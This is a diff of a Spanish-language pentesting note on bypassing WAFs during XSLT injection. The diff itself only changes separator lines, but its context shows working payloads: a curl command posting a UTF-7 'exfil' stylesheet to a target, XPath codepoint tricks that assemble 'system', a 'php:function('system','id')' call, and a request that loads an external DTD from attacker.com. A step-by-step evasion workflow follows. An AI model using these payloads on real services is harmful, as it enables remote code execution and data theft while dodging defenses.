@@ -16,7 +16,7 @@ linked:
 
 # XSLT - Bypasses y Evasión
 
-***
+---
 
 ## Encoding del Documento (UTF-16 / UTF-7 / Otros)
 
@@ -55,7 +55,7 @@ curl -X POST -H 'Content-Type: application/xml; charset=utf-7' \
   --data-binary @exfil-utf7.xsl https://target.com/transform
 ```
 
-___
+---
 
 ## Character References (Hex / Decimal / Mixed)
 
@@ -72,7 +72,7 @@ ___
 | `<xsl:value-of select="for $c in (115,121,115,116,101,109) return codepoints-to-string($c)"/>` | Sequence builder | Bypass char filter más fuerte. |
 ^xslt-bypass-chars
 
-___
+---
 
 ## String Obfuscation con XPath
 
@@ -128,7 +128,7 @@ Resultado: `php:function('system','id')` sin que `system` ni `id` aparezcan lite
 
 WAF que solo inspecciona el XSL no ve `system` — está en el XML.
 
-___
+---
 
 ## Namespaces y Prefijos Alternativos
 
@@ -162,7 +162,7 @@ ___
 
 WAF no matchea `xsl:` ni `php:function('system'` por separado.
 
-___
+---
 
 ## CDATA y Entity Wrapping
 
@@ -191,7 +191,7 @@ curl -X POST --data '<!DOCTYPE r SYSTEM "http://attacker.com/p.dtd"><r>&p;</r>' 
   https://target/transform
 ```
 
-___
+---
 
 ## Comentarios y Whitespace
 
@@ -207,7 +207,7 @@ ___
 | `<xsl:value-of select="concat( 'a' , 'b' )"/>` | Spaces dentro de function call args | Bypass regex literal `concat(`. |
 ^xslt-bypass-comments
 
-___
+---
 
 ## HTTP / Transport Layer Bypass
 
@@ -224,7 +224,7 @@ ___
 | `curl -X POST --data-binary $'<?xml version="1.0"?>\r\n\r\n<xsl:stylesheet...' https://target/` | CRLF doble entre prologue y root | Edge parser behavior. |
 ^xslt-bypass-transport
 
-___
+---
 
 ## Workflow combinado para WAF agresivo
 
@@ -241,7 +241,7 @@ ___
 6. **Escalada 5** — split payload XML + XSL (input controla los strings).
 7. **Último recurso** — remote DTD con todo el payload off-host.
 
-___
+---
 
 ## Engines compatibles por técnica
 
@@ -257,4 +257,4 @@ ___
 | CDATA wrap | ✅ | ✅ | ✅ | ✅ |
 | Namespace alterno | ✅ | ✅ | ✅ | ✅ |
 
-***
+---
